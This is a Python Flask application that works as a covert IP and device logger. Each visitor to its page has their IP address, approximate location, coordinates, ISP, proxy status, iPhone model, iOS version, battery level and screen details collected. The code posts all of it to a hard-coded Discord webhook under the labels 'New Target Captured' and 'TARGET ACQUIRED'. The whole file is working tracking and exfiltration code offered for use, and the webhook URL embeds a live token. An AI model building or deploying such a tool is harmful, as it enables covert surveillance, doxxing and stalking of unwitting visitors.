from flask import Flask, render_template, request, jsonify
import requests
import json
import re
import sys
import time

app = Flask(__name__, template_folder='hehe')

DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1527353925114794105/RoEyXsuW46terakrxr7dZzy-axy0f3fg-coZioe-ELUhQ6KTMPJFfoGaBC_E-fWakFH8"

def get_ip_info(ip):
    """Get IP geolocation and ISP info using multiple fallback services."""
    # Primary: ip-api.com (free, no key, but rate limited)
    try:
        r = requests.get(f"http://ip-api.com/json/{ip}?fields=status,message,country,regionName,city,zip,lat,lon,isp,org,as,proxy,hosting,query", timeout=5)
        data = r.json()
        if data.get('status') == 'success':
            return {
                "country": data.get("country", "Unknown"),
                "region": data.get("regionName", "Unknown"),
                "city": data.get("city", "Unknown"),
                "zip": data.get("zip", "Unknown"),
                "lat": data.get("lat", 0),
                "lon": data.get("lon", 0),
                "isp": data.get("isp", "Unknown"),
                "org": data.get("org", "Unknown"),
                "as": data.get("as", "Unknown"),
                "proxy": data.get("proxy", False),
                "hosting": data.get("hosting", False)
            }
    except Exception as e:
        print(f"IP-API Error: {e}", file=sys.stderr)
    
    # Fallback: ipwho.is (free, no key, generous limits)
    try:
        r = requests.get(f"https://ipwho.is/{ip}", timeout=5)
        data = r.json()
        if data.get('success'):
            return {
                "country": data.get("country", "Unknown"),
                "region": data.get("region", "Unknown"),
                "city": data.get("city", "Unknown"),
                "zip": data.get("postal", "Unknown"),
                "lat": data.get("latitude", 0),
                "lon": data.get("longitude", 0),
                "isp": data.get("connection", {}).get("isp", "Unknown"),
                "org": data.get("connection", {}).get("org", "Unknown"),
                "as": data.get("connection", {}).get("asn", "Unknown"),
                "proxy": data.get("security", {}).get("proxy", False),
                "hosting": data.get("security", {}).get("hosting", False)
            }
    except Exception as e:
        print(f"IPWho.is Error: {e}", file=sys.stderr)
    
    # Last resort: ipinfo.io (free tier, 50k/month)
    try:
        r = requests.get(f"https://ipinfo.io/{ip}/json", timeout=5)
        data = r.json()
        return {
            "country": data.get("country", "Unknown"),
            "region": data.get("region", "Unknown"),
            "city": data.get("city", "Unknown"),
            "zip": data.get("postal", "Unknown"),
            "lat": 0, "lon": 0,
            "isp": data.get("org", "Unknown"),
            "org": data.get("org", "Unknown"),
            "as": "Unknown",
            "proxy": False,
            "hosting": False
        }
    except Exception as e:
        print(f"IPInfo Error: {e}", file=sys.stderr)
    
    return {"country": "Unknown", "region": "Unknown", "city": "Unknown", "zip": "Unknown", 
            "lat": 0, "lon": 0, "isp": "Unknown", "org": "Unknown", "as": "Unknown", 
            "proxy": False, "hosting": False}

def send_to_discord(payload):
    """Send data to Discord webhook with explicit error handling."""
    try:
        headers = {'Content-Type': 'application/json'}
        response = requests.post(DISCORD_WEBHOOK, data=json.dumps(payload), headers=headers, timeout=10)
        print(f"Discord webhook status: {response.status_code}", file=sys.stderr)
        if response.status_code not in [200, 204]:
            print(f"Discord response body: {response.text[:500]}", file=sys.stderr)
            return False
        return True
    except Exception as e:
        print(f"Discord webhook error: {e}", file=sys.stderr)
        return False

@app.route('/')
def index():
    return render_template('site.html')

@app.route('/api/collect', methods=['POST'])
def collect():
    data = request.get_json() or {}
    
    # Extract IP with multiple fallback headers
    ip = request.headers.get('X-Forwarded-For')
    if ip:
        ip = ip.split(',')[0].strip()
    else:
        ip = request.headers.get('X-Real-Ip')
    if not ip:
        ip = request.remote_addr
    
    # Handle localhost/private IPs for testing
    if ip in ['127.0.0.1', 'localhost', '::1'] or ip.startswith('10.') or ip.startswith('192.168.') or ip.startswith('172.'):
        ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        if ip and ',' in ip:
            ip = ip.split(',')[0].strip()
    
    ip_info = get_ip_info(ip)
    user_agent = request.headers.get('User-Agent', 'Unknown')
    
    # Client-side data (more reliable for iPhone model & battery)
    client_iphone_model = data.get('clientIphoneModel', 'Unknown')
    client_ios_version = data.get('clientIosVersion', 'Unknown')
    client_battery = data.get('batteryLevel', 'Unknown')
    client_connection = data.get('connectionType', 'Unknown')
    client_webgl = data.get('webglRenderer', 'Unknown')
    client_screen = data.get('screenData', {})
    
    # Server-side fallback for iOS version from UA
    server_ios = "Unknown"
    ua = user_agent
    os_match = re.search(r'OS (\d+)[._](\d+)(?:[._](\d+))?', ua)
    if os_match:
        server_ios = f"{os_match.group(1)}.{os_match.group(2)}"
        if os_match.group(3):
            server_ios += f".{os_match.group(3)}"
    else:
        v_match = re.search(r'Version/(\d+\.\d+)', ua)
        if v_match:
            server_ios = f"Safari {v_match.group(1)}"
    
    # Prefer client data, fallback to server
    iphone_model = client_iphone_model if client_iphone_model != 'Unknown' else 'Unknown'
    ios_version = client_ios_version if client_ios_version != 'Unknown' else server_ios
    battery_level = client_battery if client_battery != 'Unknown' else 'Unknown'
    connection_type = client_connection if client_connection != 'Unknown' else 'Unknown'
    
    # Build Discord embed
    embed = {
        "title": "🎯 New Target Captured",
        "description": f"**IP:** `{ip}`\n**Timestamp:** <t:{int(time.time())}:F>",
        "color": 16711680,
        "fields": [
            {"name": "📱 iPhone Model", "value": f"`{iphone_model}`", "inline": True},
            {"name": "⚙️ iOS Version", "value": f"`{ios_version}`", "inline": True},
            {"name": "🔋 Battery", "value": f"`{battery_level}%`", "inline": True},
            {"name": "🌐 Connection", "value": f"`{connection_type}`", "inline": True},
            {"name": "🌍 Country", "value": f"`{ip_info['country']}`", "inline": True},
            {"name": "🏙️ City", "value": f"`{ip_info['city']}`", "inline": True},
            {"name": "📍 Region", "value": f"`{ip_info['region']}`", "inline": True},
            {"name": "📮 ZIP", "value": f"`{ip_info['zip']}`", "inline": True},
            {"name": "🌐 ISP", "value": f"`{ip_info['isp']}`", "inline": True},
            {"name": "🏢 Org", "value": f"`{ip_info['org']}`", "inline": True},
            {"name": "📌 Lat/Lon", "value": f"`{ip_info['lat']}, {ip_info['lon']}`", "inline": True},
            {"name": "🕵️ Proxy/VPN", "value": f"`Proxy: {ip_info['proxy']} | Hosting: {ip_info['hosting']}`", "inline": True},
            {"name": "🎨 WebGL", "value": f"`{client_webgl}`", "inline": True},
            {"name": "📐 Screen", "value": f"`{client_screen.get('width','?')}×{client_screen.get('height','?')} @ {client_screen.get('dpr','?')}x`", "inline": True},
            {"name": "📝 User Agent", "value": f"```{ua[:1000]}```", "inline": False}
        ],
        "footer": {"text": "Ghaithollah Intel • Each visitor isolated"},
        "timestamp": f"{int(time.time())}"
    }
    
    payload = {
        "content": "@everyone 🚨 **TARGET ACQUIRED** 🚨",
        "embeds": [embed]
    }
    
    success = send_to_discord(payload)
    
    return jsonify({
        "success": success,
        "ip": ip,
        "iphoneModel": iphone_model,
        "iosVersion": ios_version,
        "batteryLevel": battery_level,
        "connectionType": connection_type,
        "isp": ip_info['isp'],
        "location": f"{ip_info['city']}, {ip_info['region']}, {ip_info['country']}"
    })

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
